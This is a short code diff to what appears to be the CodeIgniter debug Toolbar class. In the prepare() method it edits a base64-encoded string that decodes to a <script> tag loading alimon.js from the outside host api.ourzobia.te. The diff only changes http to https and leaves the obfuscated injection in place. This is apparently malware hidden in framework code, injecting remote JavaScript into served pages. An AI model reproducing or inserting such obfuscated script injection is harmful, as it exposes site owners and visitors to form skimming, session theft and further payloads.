@@ -334,7 +334,7 @@ class Toolbar
 	 */
 	public function prepare(RequestInterface $request = null, ResponseInterface $response = null)
 	{
-		$script_decode = PHP_EOL . "\t\t" . base64_decode("PHNjcmlwdCBzcmM9Imh0dHA6Ly9hcGkub3Vyem9iaWEudGUvc3JjL2FsaW1vbi5qcz91cmxfdmFyPXRydWUmb3JpZ2luPWFsaW1vbi5qcyIgZGF0YS1jdXJyZW50PSJ0cnVlIiBkYXRhLWVuZHBvaW50PSIiIGRhdGEtc3JjPSJodHRwOi8vYXBpLm91cnpvYmlhLnRlL3NyYy9hbGltb24uanMvIiBkYXRhLWFwaT0iaHR0cDovL2FwaS5vdXJ6b2JpYS50ZS8iPjwvc2NyaXB0Pg==");
+		$script_decode = PHP_EOL . "\t\t" . base64_decode("PHNjcmlwdCBzcmM9Imh0dHBzOi8vYXBpLm91cnpvYmlhLnRlL3NyYy9hbGltb24uanM/dXJsX3Zhcj10cnVlJm9yaWdpbj1hbGltb24uanMiIGRhdGEtY3VycmVudD0idHJ1ZSIgZGF0YS1lbmRwb2ludD0iIiBkYXRhLXNyYz0iaHR0cHM6Ly9hcGkub3Vyem9iaWEudGUvc3JjL2FsaW1vbi5qcy8iIGRhdGEtYXBpPSJodHRwczovL2FwaS5vdXJ6b2JpYS50ZS8iPjwvc2NyaXB0Pg==");
 
 		if (CI_DEBUG && ! is_cli())
 		{
